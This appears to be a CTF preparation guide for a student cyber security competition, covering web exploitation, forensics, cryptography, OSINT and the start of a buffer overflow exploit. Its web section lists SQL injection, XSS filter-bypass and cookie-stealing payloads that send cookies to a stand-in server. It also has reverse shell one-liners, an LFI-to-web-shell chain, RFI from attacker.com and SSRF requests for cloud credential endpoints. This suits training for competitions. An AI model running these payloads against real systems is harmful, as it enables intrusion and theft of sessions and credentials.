# 🏆 LKS Cyber Security 2026 - SMKN 1 Cimahi
## Complete CTF Preparation Guide

[![CTF](https://img.shields.io/badge/CTF-Jeopardy-red.svg)](https://ctftime.org)
[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Kali Linux](https://img.shields.io/badge/Kali-Linux-557C94?logo=kalilinux)](https://www.kali.org/)

---

## 📑 Table of Contents

- [📋 Competition Overview](#-competition-overview)
- [🛠️ Tools Installation](#️-tools-installation)
- [🎯 Category Breakdown](#-category-breakdown)
  - [Web Exploitation](#1-web-exploitation)
  - [Digital Forensics](#2-digital-forensics)
  - [Cryptography](#3-cryptography)
  - [Binary Exploitation (PWN)](#4-binary-exploitation-pwn)
  - [Reverse Engineering](#5-reverse-engineering)
- [💡 Pro Tips & Strategy](#-pro-tips--strategy)
- [📚 Learning Resources](#-learning-resources)
- [🔗 Essential Links](#-essential-links)

---

## 📋 Competition Overview

### Categories Coverage

```
📌 Web Exploitation
   ├── SQL Injection
   ├── XSS (Cross-Site Scripting)
   ├── Command Injection
   ├── File Inclusion (LFI/RFI)
   ├── Directory Traversal
   ├── SSRF
   ├── IDOR
   ├── XXE
   ├── Insecure Deserialization
   └── JWT Attacks

🔍 Digital Forensics
   ├── Log Analysis
   ├── Steganography
   ├── File Recovery/Carving
   ├── Disk Forensics
   ├── Memory Forensics
   ├── Network Forensics (PCAP)
   └── OSINT

🔐 Cryptography
   ├── Encoding (Base64, Hex, Morse, etc.)
   ├── Classic Ciphers (Caesar, Vigenère, Atbash)
   ├── Weak RSA
   ├── Block Cipher Attacks
   └── Hash Attacks

💥 Binary Exploitation
   ├── Buffer Overflow
   ├── ROP (Return Oriented Programming)
   ├── Format String Bug
   ├── Integer Overflow/Underflow
   └── Heap Exploitation

🔄 Reverse Engineering
   ├── Static Analysis
   ├── Dynamic Analysis
   ├── Obfuscation
   └── Malware Analysis
```

---

## 🛠️ Tools Installation

### Quick Install Script

```bash
#!/bin/bash
# LKS-CTF-Setup.sh - One-click installation for all CTF tools

echo "🚀 Starting LKS CTF Tools Installation..."

# Update system
sudo apt update && sudo apt upgrade -y

# Web Exploitation Tools
echo "📡 Installing Web Exploitation Tools..."
sudo apt install -y burpsuite sqlmap gobuster nikto wfuzz curl wget python3-pip
pip3 install jwt_tool

# Digital Forensics Tools
echo "🔍 Installing Forensics Tools..."
sudo apt install -y volatility3 autopsy binwalk foremost wireshark steghide \
                    exiftool hexedit xxd theharvester file
pip3 install stegcracker

# Cryptography Tools
echo "🔐 Installing Cryptography Tools..."
sudo apt install -y hash-identifier john hashcat
pip3 install pycryptodome gmpy2 pycrypto

# Binary Exploitation Tools
echo "💥 Installing PWN Tools..."
sudo apt install -y gdb checksec ruby-full radare2
pip3 install pwntools ropgadget
gem install one_gadget

# Reverse Engineering Tools
echo "🔄 Installing Reverse Engineering Tools..."
sudo apt install -y radare2 cutter binutils ltrace strace upx-ucl jadx

# Clone Essential Repositories
echo "📦 Cloning Essential Repos..."
mkdir -p ~/ctf-tools
cd ~/ctf-tools

# PayloadsAllTheThings - WAJIB!
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git
# SecLists - Wordlists
git clone https://github.com/danielmiessler/SecLists.git
# RsaCtfTool
git clone https://github.com/RsaCtfTool/RsaCtfTool.git
cd RsaCtfTool && pip3 install -r requirements.txt && cd ..
# Pwndbg (GDB Enhancement)
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh && cd ..
# Sherlock (OSINT)
git clone https://github.com/sherlock-project/sherlock.git
cd sherlock && pip3 install -r requirements.txt && cd ..

echo "✅ Installation Complete!"
echo "📂 Tools location: ~/ctf-tools/"
echo "🎯 Ready for LKS CTF 2026!"
```

**Usage:**
```bash
chmod +x LKS-CTF-Setup.sh
./LKS-CTF-Setup.sh
```

### Manual Installation

<details>
<summary>Click to expand manual installation steps</summary>

#### Web Exploitation
```bash
sudo apt install burpsuite sqlmap gobuster nikto wfuzz -y
pip3 install jwt_tool
```

#### Forensics
```bash
sudo apt install volatility3 binwalk foremost wireshark steghide exiftool -y
```

#### Cryptography
```bash
sudo apt install john hashcat -y
pip3 install pycryptodome gmpy2
```

#### Binary Exploitation
```bash
sudo apt install gdb checksec -y
pip3 install pwntools ropgadget
```

#### Reverse Engineering
```bash
sudo apt install radare2 cutter ltrace strace upx-ucl -y
```

</details>

---

## 🎯 Category Breakdown

## 1. Web Exploitation

### 🎲 SQL Injection

**What it is**: Exploiting database queries to extract/manipulate data

**Common Scenarios**:
- Login bypass
- Data extraction (usernames, passwords, flags)
- Admin panel access

**Tools**:
```bash
# SQLmap - Automated SQL Injection
sqlmap -u "http://target.com/page?id=1" --batch --dbs
sqlmap -u "http://target.com/login" --data="user=admin&pass=admin" --dbs
sqlmap -r request.txt --dump
```

**Manual Payloads**:
```sql
-- Login Bypass
admin' OR '1'='1'--
admin' OR 1=1--
' OR '1'='1
" OR "1"="1

-- Union-based SQLi
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT username,password,3 FROM users--

-- Database Enumeration
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Extract Data
' UNION SELECT username,password FROM users--
' UNION SELECT group_concat(username,':',password) FROM users--

-- Time-based Blind SQLi
' AND SLEEP(5)--
' OR IF(1=1,SLEEP(5),0)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--

-- Error-based SQLi
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=1/0--
```

**Use Case Example**:
```
Challenge: Login form vulnerable to SQLi
URL: http://ctf.com/login.php

Steps:
1. Test for SQLi: admin' OR '1'='1'-- 
2. If works → bypassed!
3. Extract data:
   sqlmap -u "http://ctf.com/login.php" --data="user=admin&pass=test" --dbs
4. Dump tables:
   sqlmap -u "..." -D ctf_db -T flags --dump
5. Get flag!
```

**Reference**: `~/ctf-tools/PayloadsAllTheThings/SQL Injection/`

---

### 🎨 Cross-Site Scripting (XSS)

**What it is**: Injecting malicious JavaScript into web pages

**Types**:
- **Reflected XSS**: Payload in URL parameter
- **Stored XSS**: Payload saved in database
- **DOM-based XSS**: Client-side script manipulation

**Basic Payloads**:
```html
<!-- Simple Alert -->
<script>alert('XSS')</script>
<script>alert(document.domain)</script>

<!-- Image Onerror -->
<img src=x onerror=alert('XSS')>
<img src=x onerror=alert(document.cookie)>

<!-- SVG -->
<svg onload=alert('XSS')>
<svg/onload=alert('XSS')>

<!-- Iframe -->
<iframe src="javascript:alert('XSS')">

<!-- Body -->
<body onload=alert('XSS')>
```

**Bypass Filters**:
```html
<!-- No quotes -->
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- Case variation -->
<ScRiPt>alert('XSS')</sCrIpT>

<!-- Encoding -->
<script>alert('XSS')</script> → %3Cscript%3Ealert('XSS')%3C/script%3E

<!-- Event handlers -->
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>

<!-- Uncommon tags -->
<details open ontoggle=alert('XSS')>
<marquee onstart=alert('XSS')>
```

**Cookie Stealing**:
```html
<script>
fetch('http://your-server.com/?c='+document.cookie)
</script>

<script>
new Image().src='http://your-server.com/?c='+document.cookie
</script>
```

**Use Case Example**:
```
Challenge: Comment section reflects user input
URL: http://ctf.com/comments

Steps:
1. Test basic: <script>alert(1)</script>
2. If filtered, try: <img src=x onerror=alert(1)>
3. Check if cookie accessible: <script>alert(document.cookie)</script>
4. Flag might be in cookie or need to exfiltrate admin session
```

**Reference**: `~/ctf-tools/PayloadsAllTheThings/XSS Injection/`

---

### 💉 Command Injection

**What it is**: Executing system commands through vulnerable inputs

**Common Vulnerable Parameters**:
- `ping`, `nslookup`, `dig`
- File uploads
- System utilities

**Injection Characters**:
```bash
;   # Command separator
|   # Pipe output
||  # OR operator
&   # Background execution
&&  # AND operator
`   # Command substitution
$() # Command substitution
\n  # Newline
```

**Basic Payloads**:
```bash
# Simple command execution
; ls
| ls
|| ls
& ls
&& ls

# Read files
; cat /etc/passwd
| cat flag.txt
; cat /flag.txt

# System info
; uname -a
; id
; whoami
; pwd

# List files
; ls -la
; dir (Windows)
; find / -name flag.txt

# Reverse shell
; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
; nc YOUR_IP 4444 -e /bin/bash
```

**Bypass Spaces**:
```bash
# No spaces needed
cat</etc/passwd
{cat,/etc/passwd}
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd

# Tab character
cat%09/etc/passwd
```

**Bypass Blacklists**:
```bash
# Concatenation
c'a't /etc/passwd
c"a"t /etc/passwd
ca\t /etc/passwd

# Variable expansion
$0 → cat /etc/passwd

# Wildcards
/???/c?t /etc/passwd
/bin/n? -e /bin/sh YOUR_IP 4444
```

**Use Case Example**:
```
Challenge: Ping functionality (user input → ping command)
Input: 127.0.0.1

Steps:
1. Test injection: 127.0.0.1; ls
2. If works, read files: 127.0.0.1; cat flag.txt
3. If flag not there: 127.0.0.1; find / -name flag.txt 2>/dev/null
4. Read flag: 127.0.0.1; cat /path/to/flag.txt
```

**Tool**:
```bash
# Commix (Automated Command Injection)
commix -u "http://target.com/ping?ip=127.0.0.1"
```

**Reference**: `~/ctf-tools/PayloadsAllTheThings/Command Injection/`

---

### 📂 File Inclusion (LFI/RFI)

**What it is**: Including unauthorized files in web application

**LFI (Local File Inclusion)**:
```bash
# Basic traversal
../../../etc/passwd
../../../../etc/passwd
..%2F..%2F..%2Fetc/passwd

# Double encoding
..%252f..%252f..%252fetc/passwd

# Null byte (PHP < 5.3.4)
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg

# Common Linux files
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/var/log/apache2/access.log
/var/log/auth.log
```

**LFI to RCE (Log Poisoning)**:
```bash
# Steps:
1. Find LFI: http://target.com/page?file=../../../../var/log/apache2/access.log

2. Poison log by injecting PHP:
   curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

3. Execute command:
   http://target.com/page?file=../../../../var/log/apache2/access.log&cmd=cat+/flag.txt
```

**RFI (Remote File Inclusion)**:
```bash
# Basic RFI
http://target.com/page?file=http://attacker.com/shell.txt

# PHP shell (shell.txt content)
<?php system($_GET['cmd']); ?>

# Direct execution
http://target.com/page?file=http://attacker.com/shell.txt&cmd=id
```

**PHP Wrappers**:
```bash
# Read file content (Base64)
php://filter/convert.base64-encode/resource=index.php

# Input stream
php://input
# POST data: <?php system('id'); ?>

# Data wrapper
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# Expect wrapper
expect://id
```

**Use Case Example**:
```
Challenge: View file functionality
URL: http://ctf.com/view?file=welcome.txt

Steps:
1. Test LFI: ?file=../../../../etc/passwd
2. If works, look for flag: ?file=../../../../flag.txt
3. If not found, try: ?file=../../../../var/www/html/flag.txt
4. Try PHP wrapper: ?file=php://filter/convert.base64-encode/resource=config.php
5. Decode Base64 output to get flag
```

**Reference**: `~/ctf-tools/PayloadsAllTheThings/File Inclusion/`

---

### 🌐 Server-Side Request Forgery (SSRF)

**What it is**: Making server send requests to internal/external resources

**Basic Payloads**:
```bash
# Internal network
http://localhost
http://127.0.0.1
http://0.0.0.0
http://[::1]
http://127.1
http://127.0.1

# Port scanning
http://127.0.0.1:80
http://127.0.0.1:22
http://127.0.0.1:3306

# AWS Metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/

# Internal services
http://admin.internal
http://192.168.1.1
```

**Bypass Techniques**:
```bash
# IP encoding
http://2130706433 (decimal: 127.0.0.1)
http://0x7f000001 (hex: 127.0.0.1)
http://0177.0000.0000.0001 (octal: 127.0.0.1)

# URL encoding
http://127.0.0.1 → http://%31%32%37.%30.%30.%31

# DNS rebinding
http://spoofed.burpcollaborator.net

# Redirect
Create URL shortener pointing to localhost
```

**Use Case Example**:
```
Challenge: URL preview feature (fetch & display webpage)
Input: http://example.com

Steps:
1. Test SSRF: http://127.0.0.1
2. If works, scan ports: http://127.0.0.1:8080
3. Try AWS metadata: http://169.254.169.254/latest/meta-data/
4. Access internal service: http://localhost:8080/admin
5. Flag might be in internal endpoint
```

**Tool**:
```bash
# SSRFmap
git clone https://github.com/swisskyrepo/SSRFmap
python3 ssrfmap.py -r request.txt -p url
```

**Reference**: `~/ctf-tools/PayloadsAllTheThings/Server Side Request Forgery/`

---

### 🔑 JWT Attacks

**What it is**: Exploiting JSON Web Token vulnerabilities

**JWT Structure**:
```
header.payload.signature
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Attack Types**:

1. **None Algorithm Attack**:
```python
# Change alg to "none"
{
  "alg": "none",
  "typ": "JWT"
}

# Remove signature (keep the dot)
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

2. **Weak Secret Bruteforce**:
```bash
# jwt_tool
jwt_tool <TOKEN> -C -d /usr/share/wordlists/rockyou.txt

# hashcat
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

3. **Key Confusion (RS256 → HS256)**:
```python
# If server uses RSA public key as HS256 secret
# Use public key to sign token with HS256

# jwt_tool
jwt_tool <TOKEN> -X k -pk public.pem
```

4. **Kid (Key ID) Injection**:
```json
{
  "alg": "HS256",
  "kid": "../../../../dev/null"
}
# Signs with empty key
```

**Tools**:
```bash
# jwt_tool (Swiss Army Knife)
jwt_tool <TOKEN>
jwt_tool <TOKEN> -T  # Tamper payload
jwt_tool <TOKEN> -X a  # All attacks

# Online
https://jwt.io/
```

**Use Case Example**:
```
Challenge: Authenticated API using JWT
Token: eyJhbGci...

Steps:
1. Decode JWT: jwt_tool <token>
2. Check algorithm: if HS256, try bruteforce
3. Try none attack: jwt_tool <token> -X n
4. Tamper payload (user → admin): jwt_tool <token> -T
5. Use modified token to access admin endpoint
```

**Reference**: `~/ctf-tools/PayloadsAllTheThings/JSON Web Token/`

---

## 2. Digital Forensics

### 🖼️ Steganography

**What it is**: Hiding data inside images/files

**Tools & Commands**:

```bash
# 1. Strings (always try first!)
strings image.jpg | grep -i flag
strings image.jpg | grep "CTF"

# 2. Exiftool (check metadata)
exiftool image.jpg
exiftool -all image.jpg

# 3. Binwalk (extract hidden files)
binwalk image.png
binwalk -e image.png
binwalk --dd='.*' image.png

# 4. Steghide (password-protected)
steghide info image.jpg
steghide extract -sf image.jpg
steghide extract -sf image.jpg -p password

# If password unknown, bruteforce:
stegcracker image.jpg /usr/share/wordlists/rockyou.txt

# 5. Zsteg (PNG/BMP specific)
zsteg image.png
zsteg -a image.png  # Try all methods

# 6. Stegsolve (GUI - bit plane analysis)
java -jar stegsolve.jar
# Manual: Check all color planes (Red 0-7, Green 0-7, Blue 0-7)

# 7. Forensically (online tool)
https://29a.ch/photo-forensics/

# 8. StegSeek (faster stegcracker)
stegseek image.jpg wordlist.txt
```

**Use Case Example**:
```
Challenge: image.jpg file given

Steps:
1. strings image.jpg | grep flag
2. exiftool image.jpg (check comment field)
3. binwalk image.jpg (check for hidden files)
4. steghide extract -sf image.jpg
5. If password needed: stegcracker image.jpg rockyou.txt
6. Open in Stegsolve, check LSB/bit planes
7. zsteg image.jpg (if PNG)
```

**Hidden Data Locations**:
- EXIF metadata
- Comment fields
- LSB (Least Significant Bit)
- Appended files
- Color planes
- Alpha channel

---

### 🔍 File Recovery & Carving

**What it is**: Recovering deleted/hidden files from disk images

**Tools**:

```bash
# 1. Foremost (file carving)
foremost -i disk.img -o output/
foremost -i disk.img -t jpg,png,pdf -o output/

# 2. Scalpel (faster alternative)
scalpel disk.img -o output/

# 3. Binwalk (file extraction)
binwalk -e disk.img
binwalk --dd='.*' disk.img

# 4. PhotoRec (GUI/CLI recovery)
photorec disk.img

# 5. Bulk Extractor
bulk_extractor -o output disk.img

# 6. TestDisk (partition recovery)
testdisk disk.img
```

**File Signatures (Magic Bytes)**:
```
PNG: 89 50 4E 47
JPG: FF D8 FF E0
PDF: 25 50 44 46
ZIP: 50 4B 03 04
GIF: 47 49 46 38
```

**Manual Carving**:
```bash
# Find file signatures
xxd disk.img | grep "5089 4e47"  # PNG header

# Extract using dd
dd if=disk.img of=recovered.png bs=1 skip=12345 count=67890
```

**Use Case Example**:
```
Challenge: disk.img (disk image file)

Steps:
1. file disk.img (check type)
2. foremost -i disk.img -o recovered/
3. cd recovered/ && ls -la
4. Check recovered files for flag
5. If not found: binwalk -e disk.img
6. strings disk.img | grep -i flag
```

---

### 🧠 Memory Forensics (Volatility)

**What it is**: Analyzing memory dumps for artifacts

**Volatility 3 Commands**:

```bash
# 1. Identify OS/Profile
volatility3 -f memory.dump windows.info
volatility3 -f memory.dump linux.info

# 2. List Processes
volatility3 -f memory.dump windows.pslist
volatility3 -f memory.dump windows.pstree
volatility3 -f memory.dump windows.psscan

# 3. Command Line
volatility3 -f memory.dump windows.cmdline

# 4. Network Connections
volatility3 -f memory.dump windows.netstat
volatility3 -f memory.dump windows.netscan

# 5. Dump Files
volatility3 -f memory.dump windows.filescan | grep -i flag
volatility3 -f memory.dump windows.dumpfiles --pid 1234

# 6. Registry
volatility3 -f memory.dump windows.registry.hivelist
volatility3 -f memory.dump windows.registry.printkey --key "Software\Microsoft"

# 7. Clipboard
volatility3 -f memory.dump windows.clipboard

# 8. Strings Search
strings memory.dump | grep -i "flag{"
strings memory.dump | grep -i "password"
```

**Use Case Example**:
```
Challenge: memory.dmp (memory dump)

Steps:
1. volatility3 -f memory.dmp windows.info
2. volatility3 -f memory.dmp windows.pslist (find suspicious process)
3. volatility3 -f memory.dmp windows.cmdline (check commands)
4. volatility3 -f memory.dmp windows.filescan | grep flag
5. volatility3 -f memory.dmp windows.dumpfiles --pid <PID>
6. strings memory.dmp | grep "CTF{"
```

---

### 📦 Network Forensics (PCAP)

**What it is**: Analyzing network traffic captures

**Wireshark Filters**:
```bash
# Protocol filters
http
ftp
dns
smtp
tcp
udp

# IP filters
ip.addr == 192.168.1.1
ip.src == 192.168.1.1
ip.dst == 192.168.1.1

# Port filters
tcp.port == 80
tcp.port == 443
tcp.port == 21

# HTTP specific
http.request.method == "POST"
http.request.uri contains "admin"
http contains "password"

# Follow TCP stream
tcp.stream eq 0

# Search for strings
frame contains "flag"
tcp contains "CTF{"
```

**Command Line Tools**:
```bash
# 1. tshark (CLI Wireshark)
tshark -r capture.pcap -Y "http"
tshark -r capture.pcap -Y "http.request" -T fields -e http.request.uri
tshark -r capture.pcap -Y "tcp.port==80" -T fields -e ip.src -e ip.dst

# 2. tcpdump
tcpdump -r capture.pcap
tcpdump -r capture.pcap 'port 80'
tcpdump -r capture.pcap -A | grep -i flag

# 3. tcpflow (extract files)
tcpflow -r capture.pcap

# 4. NetworkMiner (GUI - extract files)
networkminer capture.pcap

# 5. Strings
strings capture.pcap | grep -i flag
```

**Extract Files from PCAP**:
```bash
# Wireshark GUI:
File → Export Objects → HTTP/SMB/FTP

# tshark:
tshark -r capture.pcap --export-objects http,./output/

# tcpflow:
tcpflow -r capture.pcap -o output/
```

**Use Case Example**:
```
Challenge: capture.pcap (network capture)

Steps:
1. Open in Wireshark
2. Statistics → Protocol Hierarchy (overview)
3. Filter: http (check HTTP traffic)
4. File → Export Objects → HTTP
5. Check downloaded files for flag
6. If encrypted: look for credentials in plaintext protocols
7. Follow TCP streams (right-click → Follow → TCP Stream)
8. strings capture.pcap | grep "flag{"
```

---

### 📝 Log Analysis

**What it is**: Finding suspicious activities in log files

**Common Log Locations (Linux)**:
```bash
/var/log/auth.log       # Authentication
/var/log/syslog         # System logs
/var/log/apache2/access.log  # Web server
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/mysql/error.log
```

**Useful Commands**:
```bash
# 1. Failed login attempts
grep "Failed password" /var/log/auth.log
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr

# 2. Successful logins
grep "Accepted password" /var/log/auth.log

# 3. IP addresses extraction
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" logfile.log | sort | uniq -c | sort -nr

# 4. Find specific user activity
grep "username" /var/log/auth.log

# 5. Web access analysis
# Most accessed pages
awk '{print $7}' /var/log/apache2/access.log | sort | uniq -c | sort -nr

# IP with most requests
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -nr

# 404 errors
grep "404" /var/log/apache2/access.log

# 6. Search for keywords
grep -i "flag" /var/log/*.log
grep -i "error" /var/log/syslog
grep -i "warning" /var/log/syslog

# 7. Time range filtering
awk '$0 ~ /Oct 31.*19:30/,/Oct 31.*22:00/' /var/log/auth.log

# 8. Suspicious commands
grep -E "(wget|curl|nc|bash)" /var/log/auth.log
```

**Use Case Example**:
```
Challenge: auth.log (authentication log file)

Steps:
1. grep "Failed password" auth.log (brute force attempts?)
2. grep "Accepted password" auth.log (successful logins)
3. Look for unusual times/IPs
4. grep -i "flag" auth.log
5. awk '{print $9}' auth.log | sort | uniq (check usernames)
6. Flag might be hidden in: username, IP, timestamp pattern
```

---

### 🕵️ OSINT (Open-Source Intelligence)

**What it is**: Gathering information from public sources

**Username Search**:
```bash
# Sherlock (find username across platforms)
cd ~/ctf-tools/sherlock
python3 sherlock.py username

# Online tools:
https://namechk.com/
https://whatsmyname.app/
```

**Email Investigation**:
```bash
# theHarvester
theHarvester -d domain.com -b google,bing,linkedin

# Hunter.io (email finder)
https://hunter.io/

# Have I Been Pwned
https://haveibeenpwned.com/
```

**Google Dorking**:
```
site:target.com                    # Specific site
filetype:pdf site:target.com       # Specific file type
inurl:admin site:target.com        # URL contains
intitle:"index of" site:target.com # Directory listing
cache:target.com                   # Cached version
"exact phrase" site:target.com     # Exact match

# Common dorks:
site:target.com ext:sql
site:target.com inurl:login
site:target.com intitle:admin
```

**Domain/IP Investigation**:
```bash
# WHOIS lookup
whois target.com
whois 192.168.1.1

# DNS lookup
nslookup target.com
dig target.com ANY

# Subdomain enumeration
sublist3r -d target.com

# Shodan (IoT search engine)
https://www.shodan.io/
```

**Wayback Machine**:
```
https://web.archive.org/
# Check old versions of websites
```

**Social Media OSINT**:
```bash
# Tools:
- Maltego (comprehensive OSINT tool)
- SpiderFoot (automated OSINT)
- Recon-ng (modular framework)
```

**Use Case Example**:
```
Challenge: Find flag associated with username "johndoe123"

Steps:
1. python3 sherlock.py johndoe123
2. Check all found profiles
3. Look for: bio, tweets, posts, images, metadata
4. Check GitHub repos, pastebin posts
5. Google: "johndoe123 flag"
6. Check Wayback Machine for old profiles
7. Flag might be in: tweet, bio, commit message, image EXIF
```

---

## 3. Cryptography

### 🔤 Encoding/Decoding

**Common Encodings**:

```bash
# Base64
echo "SGVsbG8gV29ybGQ=" | base64 -d
echo "Hello World" | base64

# Base32
echo "JBSWY3DPEBLW64TMMQ======" | base32 -d

# Hex (Hexadecimal)
echo "48656c6c6f" | xxd -r -p
echo "Hello" | xxd -p

# Binary
echo "01001000 01101001" | perl -lpe '$_=pack"B*",$_'

# URL Encoding
echo "Hello%20World" | python3 -c "import sys; from urllib.parse import unquote; print(unquote(sys.stdin.read()))"

# ROT13
echo "Uryyb Jbeyq" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Morse Code (use online tools)
https://morsedecoder.com/
```

**Multi-layer Encoding**:
```bash
# Often encoded multiple times!
# Example: Base64 → Hex → Base64

# CyberChef (auto-detect)
https://gchq.github.io/CyberChef/
# Use "Magic" operation for auto-decode
```

**Use Case Example**:
```
Challenge: "U0dWc2JHOD0="

Steps:
1. Looks like Base64 (= padding)
2. echo "U0dWc2JHOD0=" | base64 -d
   Output: SGVsbG8=
3. Decode again: echo "SGVsbG8=" | base64 -d
   Output: Hello
4. Flag format might be: flag{Hello}
```

**Tools**:
```bash
# CyberChef (BEST TOOL!)
https://gchq.github.io/CyberChef/

# dcode.fr (cipher identifier)
https://www.dcode.fr/cipher-identifier

# Base64 decoder
https://www.base64decode.org/
```

---

### 🔐 Classic Ciphers

**Caesar Cipher** (ROT-N):
```bash
# Try all shifts (0-25)
for i in {0..25}; do echo "KHOOR" | tr "A-Z" "$(printf %s {A..Z} | sed "s/^\(.\{$i\}\)\(.*\)/\2\1/")"; done

# ROT13 specifically
echo "Uryyb" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Online tool
https://www.dcode.fr/caesar-cipher
```

**Vigenère Cipher**:
```python
# Requires key
# Use online tool:
https://www.dcode.fr/vigenere-cipher

# If key unknown, try frequency analysis
# Common keys: "KEY", "PASSWORD", "SECRET"
```

**Atbash Cipher** (Reverse alphabet):
```bash
# A→Z, B→Y, C→X, etc.
echo "SVOOL" | tr 'A-Za-z' 'ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba'

# Online
https://www.dcode.fr/atbash-cipher
```

**Substitution Cipher**:
```
Use frequency analysis:
E, T, A, O, I, N (most common letters)

Tool: https://quipqiup.com/ (automatic solver)
```

**Use Case Example**:
```
Challenge: "KHOOR ZRUOG"

Steps:
1. Identify cipher (looks like Caesar - letter shift)
2. Try all ROT values:
   ROT3: KHOOR → HELLO
3. Full decode: KHOOR ZRUOG → HELLO WORLD
4. Flag: flag{HELLO_WORLD}
```

---

### 🔑 RSA Attacks

**What it is**: Exploiting weak RSA implementations

**Common Weaknesses**:

1. **Small N (factorizable)**:
```bash
# Use RsaCtfTool
cd ~/ctf-tools/RsaCtfTool
python3 RsaCtfTool.py --publickey public.pem --uncipherfile flag.enc

# Factorize N online
http://factordb.com/
# If N is factored, calculate d and decrypt
```

2. **Small Exponent (e=3)**:
```python
# Low public exponent attack
# If m^3 < N, can directly calculate cube root
import gmpy2
c = 12345  # ciphertext
m = gmpy2.iroot(c, 3)[0]
print(bytes.fromhex(hex(m)[2:]))
```

3. **Common Modulus Attack**:
```python
# Same N, different e values
# Can decrypt without private key
```

4. **Wiener's Attack** (small d):
```bash
python3 RsaCtfTool.py --publickey public.pem --uncipherfile flag.enc --attack wiener
```

**Manual RSA Decryption**:
```python
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

# Load private key
with open('private.pem', 'r') as f:
    key = RSA.import_key(f.read())

# Decrypt
cipher = PKCS1_OAEP.new(key)
with open('flag.enc', 'rb') as f:
    ciphertext = f.read()
plaintext = cipher.decrypt(ciphertext)
print(plaintext)
```

**Use Case Example**:
```
Challenge: public.pem + flag.enc

Steps:
1. Extract N and e from public key:
   openssl rsa -pubin -in public.pem -text -noout
2. Check N on factordb.com
3. If factored: use RsaCtfTool
   python3 RsaCtfTool.py --publickey public.pem --uncipherfile flag.enc
4. If e=3: try cube root attack
5. Get flag!
```

**Tools**:
```bash
# RsaCtfTool (Swiss Army Knife)
cd ~/ctf-tools/RsaCtfTool
python3 RsaCtfTool.py --help

# Online factorization
http://factordb.com/
http://www.alpertron.com.ar/ECM.HTM
```

---

### 🔓 Hash Cracking

**Identify Hash Type**:
```bash
# hash-identifier
hash-identifier
# Paste hash

# hashid
hashid <hash>
hashid -m <hash>  # Show hashcat mode
```

**Common Hash Types**:
```
MD5:     32 chars (5d41402abc4b2a76b9719d911017c592)
SHA1:    40 chars (aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d)
SHA256:  64 chars
NTLM:    32 chars (same length as MD5)
bcrypt:  $2a$10$... or $2b$10$...
```

**John the Ripper**:
```bash
# Basic usage
john hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Specific format
john --format=raw-md5 hash.txt
john --format=raw-sha1 hash.txt

# Show cracked
john --show hash.txt

# Custom rules
john --wordlist=wordlist.txt --rules hash.txt
```

**Hashcat**:
```bash
# Hash modes (common)
# 0    = MD5
# 100  = SHA1
# 1000 = NTLM
# 1400 = SHA256
# 3200 = bcrypt

# Basic usage
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack (brute force)
hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l  # 6 lowercase letters

# Show cracked
hashcat -m 0 hash.txt --show
```

**Online Crackers**:
```
https://crackstation.net/
https://hashes.com/en/decrypt/hash
https://md5decrypt.net/
```

**Use Case Example**:
```
Challenge: 5d41402abc4b2a76b9719d911017c592

Steps:
1. hashid: identifies as MD5
2. Try online: crackstation.net
   Result: "hello"
3. If not found, use john:
   echo "5d41402abc4b2a76b9719d911017c592" > hash.txt
   john --format=raw-md5 --wordlist=rockyou.txt hash.txt
4. Flag: flag{hello}
```

---

## 4. Binary Exploitation (PWN)

### 💥 Buffer Overflow Basics

**What it is**: Overwriting memory to control execution

**Check Binary Protections**:
```bash
checksec ./binary

# Output explains:
# RELRO: Relocation Read-Only
# Stack: Stack canary (防护)
# NX: No-eXecute (stack not executable)
# PIE: Position Independent Executable
```

**Basic Buffer Overflow (ret2win)**:
```python
from pwn import *

# Start process
elf = ELF('./vuln')
p = process('./vuln')
# p = remote('target.com', 1337)  # For remote

# Find win function address
win_addr = elf.symbols['win']

# Find offset (buffer size)
# Method 1: Send cyclic pattern
payload = cyclic(200)
p.sendline(payload)
# Program crashes, check crash offset
# offset = cyclic_find(0x6161616c)  # Use crashed address

# Method 2: Trial and error
offset = 64  # Common sizes: 32, 64, 128

# Craft exploit
payload = b'A' * offset
